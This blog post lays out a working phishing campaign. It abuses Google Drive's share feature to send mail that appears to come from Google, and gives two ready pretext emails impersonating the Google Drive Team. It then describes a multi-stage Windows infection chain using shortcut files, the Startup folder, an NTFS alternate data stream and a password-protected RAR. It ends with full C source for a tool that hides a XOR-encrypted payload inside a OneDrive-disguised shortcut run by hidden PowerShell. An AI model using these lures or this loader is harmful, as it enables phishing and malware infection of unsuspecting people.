---
title: "Awesome Phishing Scenario"
layout: "post"
categories: ["Research"]
tags: ["Research"]
image: /assets/og/1733.png
youtubeId: ORPrpKvO56M
---

When you want to download file (unless it's a direct link, of course.) from Google Drive, you'll see Share button in the top right corner.

![Share Button](/assets/posts/2024-07-14-phishing-is-real/share_button.png)

When you click its, somethings should catches your attention. You can send an email to anyone you want.

![Share Content](/assets/posts/2024-07-14-phishing-is-real/share_content.png)

## Pretext

```plaintext
Hello from Google Drive,

This is last reminder for you. Your file may violate Google Drive's Terms of Service.

"**********.exe" contains content that may violate Google Drive's Malware and Similar 
Malicious Content policy. Before our legal team takes any action, we are awaiting your response. 
The reason for this is that your account may have been compromised, and malicious activities may 
be occurring without your knowledge. If you think this is an error, please check for the file 
modifications mentioned in the attachment, please do not hesitate to provide us with your 
feedback.

Details of the flagged file:

File Name: **********.exe
Upload Date: 11:37 PM *** 5


Thank you,
Google Drive Team
```

## Mail Client Screenshots

The recipient will see the email we sent as shown in the images below.

![Inbox](/assets/posts/2024-07-14-phishing-is-real/inbox.png)

![Inbox](/assets/posts/2024-07-14-phishing-is-real/inbox2.png)

![Mail Client](/assets/posts/2024-07-14-phishing-is-real/mail_client_1.png)

![Mail Client](/assets/posts/2024-07-14-phishing-is-real/mail_client_2.png)

As you can see in the above screenshots, although our email address is `driveplatform.noreply@gmail.com`, the email appears to be sent by Google.So, `drive-shares-dm-noreply@google.com`. This is an advantage for attackers. `Google Drive Support` is the username we have on __Google Drive__. Of course, we can mimic this username when we create an account on Gmail.

## Another Pretext

```plaintext
Dear info,

We hope this email finds you well.

We are writing to inform you that a file you recently uploaded to your Google Drive account 
has been flagged as potentially harmful by our security systems. To ensure the safety and 
integrity of our services, we will temporarily restricted access to this file.

Details of the flagged file:

File Name: ******** Client.rar
Upload Date: 2:06 AM May 2


If you believe this file has been incorrectly flagged, We have created temp short url for you. 
You can access link provided for you to follow the instructions :

Link : https://shorturl.at/Z4Dcv

We apologize for any inconvenience this may cause and appreciate your cooperation in maintaining 
the security of our platform.

Thank you for your attention to this matter.

Best regards,

The Google Drive Team
```

For example If you want to phish someone who has uploaded a file to Google Drive, you can view his Google Username and email information from details and report menu.

![Details](/assets/posts/2024-07-14-phishing-is-real/Details.png)

![Details](/assets/posts/2024-07-14-phishing-is-real/email.png)

> If you send phishing email to Microsoft email accounts, Microsoft highlights your link in email body.
{: .prompt-tip}

![Highlight](/assets/posts/2024-07-14-phishing-is-real/highlight.png)

You can also put a direct link using the references below:

- [https://www.howtogeek.com/747810/how-to-make-a-direct-download-link-for-google-drive-files/](https://www.howtogeek.com/747810/how-to-make-a-direct-download-link-for-google-drive-files/)
- [https://sites.google.com/site/gdocs2direct/](https://sites.google.com/site/gdocs2direct/)

## If victim downloads our file that looking legitimite

![Download](/assets/posts/2024-07-14-phishing-is-real/download.png)

The victim will either click on it after extracting it from the rar file or open the rar file directly. Let's look at both images.

If unrar:

![Download](/assets/posts/2024-07-14-phishing-is-real/unrar.png)

If click directly:

![Download](/assets/posts/2024-07-14-phishing-is-real/rar.png)

## Let's Analyze Shortcut Files

You know, shortcut files usually aim to run target files.

__For Google Policy Violation Warning.pdf.lnk:__

![Download](/assets/posts/2024-07-14-phishing-is-real/google-lnk.png)

```bat
C:\>%ProgramW6432%\WinRAR\UnRAR.exe x "%userprofile%\Downloads\Google Policy Violation Warning.rar" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

There's no need to explain the code; it's clear enough.

> WinRAR is usually installed on computers, and UnRAR.exe does not exist in the [LOLBAS Project](https://lolbas-project.github.io/#)
{: .prompt-tip}

__README.md.lnk:__

This file is going to be run on startup.

```bat
C:\Windows\System32\expand.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Google Policy Violation Warning.pdf.lnk:qwerty" -F:* "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
```
> expand.exe is built on Windows. I hope that you have seen NTFS data stream..
{: .prompt-info }

```console
$@echo off
C:\> dir

 Volume in drive C has no label.
 Volume Serial Number is 588D-8645

 Directory of C:\Users\salzE\Desktop\test

07/15/2024  08:19 AM    <DIR>          .
07/15/2024  08:18 AM    <DIR>          ..
07/01/2024  05:36 PM             1,720 a.rar
07/01/2024  05:48 PM             2,857 Send to OneNote.lnk
               2 File(s)          4,577 bytes
               2 Dir(s)  603,588,624,384 bytes free

C:\> dir a.rar "Send to OneNote.lnk" /s /b /a-d > files.txt
C:\> type files.txt

C:\Users\salzE\Desktop\test\a.rar
C:\Users\salzE\Desktop\test\Send to OneNote.lnk
notepad files.txt
type files.txt
C:\Users\salzE\Desktop\test\a.rar
"C:\Users\salzE\Desktop\test\Send to OneNote.lnk"

C:\> makecab /d "CabinetName1=test.cab" /f files.txt

Cabinet Maker - Lossless Data Compression Tool

4,577 bytes in 2 files
Total files:              2
Bytes before:         4,577
Bytes after:          2,633
After/Before:            57.53% compression
Time:                     0.03 seconds ( 0 hr  0 min  0.03 sec)
Throughput:             139.68 Kb/second

C:\> type test.cab > "Google Policy Violation Warning.pdf.lnk:qwerty"

C:\> dir /r

 Volume in drive C has no label.
 Volume Serial Number is 588D-8645

 Directory of C:\Users\salzE\Desktop\test

07/15/2024  08:32 AM    <DIR>          .
07/15/2024  08:18 AM    <DIR>          ..
07/01/2024  05:36 PM             1,720 a.rar
07/15/2024  08:24 AM                86 files.txt
07/15/2024  08:32 AM             2,743 Google
07/15/2024  08:32 AM             2,951 Google Policy Violation Warning.pdf.lnk
                                 2,743 Google Policy Violation Warning.pdf.lnk:qwerty:$DATA
07/01/2024  05:48 PM             2,857 Send to OneNote.lnk
07/15/2024  08:25 AM               955 setup.inf
07/15/2024  08:25 AM               283 setup.rpt
07/15/2024  08:25 AM             2,743 test.cab
               8 File(s)         14,338 bytes
               2 Dir(s)  603,581,587,456 bytes free
```
![Cabinet](/assets/posts/2024-07-14-phishing-is-real/cab.png)

__After execution, So next startup:__

![Startup](/assets/posts/2024-07-14-phishing-is-real/startup.png)

You should see two new files (a.rar and OneNote Shortcut). OneNote is the default, I know, I must force it. Yes, I know... Just focus on the technique.

```bat
%ProgramW6432%\WinRAR\UnRAR.exe x "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\a.rar" -pS1B3R@!
```

> We sent a phishing email with an attached rar file that has no password. But, what's that?! It contains another rar file, and this one has a password. Did you like it?
{: .prompt-tip}

__And again another next startup:__

![Startup](/assets/posts/2024-07-14-phishing-is-real/last_startup.png)

Did you see one more shortcut file? (Microsoft One Drive)

## Let's analyze what this shortcut file does.

![Shortcut](/assets/posts/2024-07-14-phishing-is-real/last_shortcut.png)

As you can see, The target can't see it. Because it's overflowed with 512 bytes as space. Or, you can apply other trick. .. ? buraya diğer trick'i yazdır.

```c
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>

#define INVALID_SET_FILE_POINTER 0xFFFFFFFF

#define HasName 0x00000004
#define HasArguments 0x00000020
#define HasIconLocation 0x00000040
#define IsUnicode 0x00000080
#define HasExpString 0x00000200
#define PreferEnvironmentPath 0x02000000

struct ShellLinkHeaderStruct
{
	DWORD dwHeaderSize;
	CLSID LinkCLSID;
	DWORD dwLinkFlags;
	DWORD dwFileAttributes;
	FILETIME CreationTime;
	FILETIME AccessTime;
	FILETIME WriteTime;
	DWORD dwFileSize;
	DWORD dwIconIndex;
	DWORD dwShowCommand;
	WORD wHotKey;
	WORD wReserved1;
	DWORD dwReserved2;
	DWORD dwReserved3;
};

struct EnvironmentVariableDataBlockStruct
{
	DWORD dwBlockSize;
	DWORD dwBlockSignature;
	char szTargetAnsi[MAX_PATH];
	wchar_t wszTargetUnicode[MAX_PATH];
};

DWORD CreateLinkFile(char* pExePath, char* pOutputLinkPath, char* pLinkIconPath, char* pLinkDescription)
{
	HANDLE hLinkFile = NULL;
	HANDLE hExeFile = NULL;
	struct ShellLinkHeaderStruct ShellLinkHeader;
	struct EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock;
	DWORD dwBytesWritten = 0;
	WORD wLinkDescriptionLength = 0;
	wchar_t wszLinkDescription[512];
	WORD wCommandLineArgumentsLength = 0;
	wchar_t wszCommandLineArguments[8192];
	WORD wIconLocationLength = 0;
	wchar_t wszIconLocation[512];
	BYTE bExeDataBuffer[1024];
	DWORD dwBytesRead = 0;
	DWORD dwEndOfLinkPosition = 0;
	DWORD dwCommandLineArgsStartPosition = 0;
	wchar_t* pCmdLinePtr = NULL;
	wchar_t wszOverwriteSkipBytesValue[16];
	wchar_t wszOverwriteSearchLnkFileSizeValue[16];
	BYTE bXorEncryptValue = 0;
	DWORD dwTotalFileSize = 0;

	// set xor encrypt value
	bXorEncryptValue = 0x77;

	// create link file
	hLinkFile = CreateFileA(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLinkFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create output file\n");
		return 1;
	}

	// initialise link header
	memset((void*)&ShellLinkHeader, 0, sizeof(ShellLinkHeader));
	ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader);
	CLSIDFromString(L"{00021401-0000-0000-C000-000000000046}", &ShellLinkHeader.LinkCLSID);
	ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;
	ShellLinkHeader.dwFileAttributes = 0;
	ShellLinkHeader.CreationTime.dwHighDateTime = 0;
	ShellLinkHeader.CreationTime.dwLowDateTime = 0;
	ShellLinkHeader.AccessTime.dwHighDateTime = 0;
	ShellLinkHeader.AccessTime.dwLowDateTime = 0;
	ShellLinkHeader.WriteTime.dwHighDateTime = 0;
	ShellLinkHeader.WriteTime.dwLowDateTime = 0;
	ShellLinkHeader.dwFileSize = 0;
	ShellLinkHeader.dwIconIndex = 0;
	ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;
	ShellLinkHeader.wHotKey = 0;

	// write ShellLinkHeader
	if (WriteFile(hLinkFile, (void*)&ShellLinkHeader, sizeof(ShellLinkHeader), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set link description
	memset(wszLinkDescription, 0, sizeof(wszLinkDescription));
	mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1);
	wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);

	// write LinkDescriptionLength
	if (WriteFile(hLinkFile, (void*)&wLinkDescriptionLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write LinkDescription
	if (WriteFile(hLinkFile, (void*)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set target command-line
	memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments));
	//_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = '%%temp%%\\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^& $path;", "", bXorEncryptValue);
	_snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L"%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $c=([byte[]]($file ^| select -Skip 000000));[System.Text.Encoding]::UTF8.GetString($c) ^| iex", "", bXorEncryptValue);
	wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);

	// write CommandLineArgumentsLength
	if (WriteFile(hLinkFile, (void*)&wCommandLineArgumentsLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// store start of command-line arguments position
	dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL);

	// write CommandLineArguments
	if (WriteFile(hLinkFile, (void*)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// set link icon path
	memset(wszIconLocation, 0, sizeof(wszIconLocation));
	mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1);
	wIconLocationLength = (WORD)wcslen(wszIconLocation);

	// write IconLocationLength
	if (WriteFile(hLinkFile, (void*)&wIconLocationLength, sizeof(WORD), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// write IconLocation
	if (WriteFile(hLinkFile, (void*)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// initialise environment variable data block
	memset((void*)&EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock));
	EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock);
	EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001;
	strncpy(EnvironmentVariableDataBlock.szTargetAnsi, "%windir%\\system32\\cmd.exe", sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1);
	mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1);

	// write EnvironmentVariableDataBlock
	if (WriteFile(hLinkFile, (void*)&EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// store end of link data position
	dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL);

	// open target exe file
	hExeFile = CreateFileA(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hExeFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open exe file\n");

		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// append exe file to the end of the lnk file
	for (;;)
	{
		// read data from exe file
		if (ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &dwBytesRead, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);

			return 1;
		}

		// check for end of file
		if (dwBytesRead == 0)
		{
			break;
		}

		// "encrypt" the exe file data
		for (DWORD i = 0; i < dwBytesRead; i++)
		{
			bExeDataBuffer[i] ^= bXorEncryptValue;
		}

		// write data to lnk file
		if (WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &dwBytesWritten, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hLinkFile);

			return 1;
		}
	}

	// close exe file handle
	CloseHandle(hExeFile);

	// store total file size
	dwTotalFileSize = GetFileSize(hLinkFile, NULL);

	// find the offset value of the number of bytes to skip in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"select -Skip 000000)");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}
	pCmdLinePtr += strlen("select -Skip ");

	// move the file pointer back to the "000000" value in the command-line arguments
	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue));
	_snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L"%06u", dwEndOfLinkPosition);
	if (WriteFile(hLinkFile, (void*)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// find the offset value of the total lnk file length in the command-line arguments
	pCmdLinePtr = wcsstr(wszCommandLineArguments, L"_.length -eq 0x00000000}");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}
	pCmdLinePtr += strlen("_.length -eq ");

	// move the file pointer back to the "0x00000000" value in the command-line arguments
	if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE*)pCmdLinePtr - (BYTE*)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// overwrite link file size
	memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue));
	_snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L"0x%08X", dwTotalFileSize);
	if (WriteFile(hLinkFile, (void*)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hLinkFile);

		return 1;
	}

	// close output file handle
	CloseHandle(hLinkFile);

	return 0;
}

int main(int argc, char* argv[])
{
	char* pExePath = NULL;
	char* pOutputLinkPath = NULL;

	if (argc != 3)
	{
		printf("Usage: %s [exe_path] [output_lnk_path]\n\n", argv[0]);

		return 1;
	}

	// get params
	pExePath = argv[1];
	pOutputLinkPath = argv[2];

	// create a link file containing the target exe
	if (CreateLinkFile(pExePath, pOutputLinkPath, "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23") != 0)
	{
		printf("Error\n");

		return 1;
	}

	printf("Finished\n");

	return 0;
}
```
